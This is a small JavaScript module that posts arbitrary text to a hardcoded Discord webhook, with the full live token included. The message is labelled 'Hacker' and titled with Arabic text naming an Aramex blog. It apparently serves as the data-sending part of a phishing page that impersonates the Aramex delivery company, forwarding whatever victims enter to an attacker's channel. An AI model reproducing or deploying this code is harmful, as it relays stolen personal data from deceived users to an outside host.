import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329104341792985088/akf5cOI6AZdYJoQ2F5N6g86NqOBSYxjwRMaiZB_hpw7zfRY0BxGcPYhbK5dgUrfbMYaT",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
